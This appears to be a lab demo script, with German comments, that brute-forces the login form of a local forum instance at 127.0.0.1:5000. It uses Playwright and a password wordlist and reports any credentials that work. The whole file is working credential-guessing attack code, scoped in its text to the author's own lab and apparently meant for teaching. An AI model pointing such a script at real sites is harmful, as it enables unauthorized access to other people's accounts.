"""Brute-Force-Demo gegen das EIGENE lokale Cowboy-Forum mit Playwright.

Nur gegen http://127.0.0.1:5000 (deine Lab-Instanz). Probiert eine Passwortliste
für einen Zielbenutzer durch und meldet den Treffer.

Setup:
    pip install playwright
    playwright install chromium
    python attack_playwright.py --user admin --wordlist rockyou_small.txt
"""
import argparse
import sys

from playwright.sync_api import sync_playwright

BASE = "http://127.0.0.1:5000"


def try_login(page, user: str, pw: str) -> bool:
    page.goto(f"{BASE}/login")
    page.fill('input[name="username"]', user)
    page.fill('input[name="password"]', pw)
    page.click('button[type="submit"], input[type="submit"]')
    page.wait_for_load_state("networkidle")
    # Erfolg: kein "Falscher Benutzername oder Passwort" mehr auf der Seite.
    return "Falscher Benutzername oder Passwort" not in page.content()


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--user", required=True)
    ap.add_argument("--wordlist", required=True)
    args = ap.parse_args()

    with open(args.wordlist, encoding="utf-8", errors="ignore") as fh:
        words = [w.strip() for w in fh if w.strip()]

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()
        for i, pw in enumerate(words, 1):
            if try_login(page, args.user, pw):
                print(f"\n[+] TREFFER nach {i} Versuchen: {args.user}:{pw}")
                browser.close()
                return 0
            print(f"[{i}/{len(words)}] {pw!r} falsch", end="\r")
        browser.close()
    print("\n[-] Kein Treffer in der Liste.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
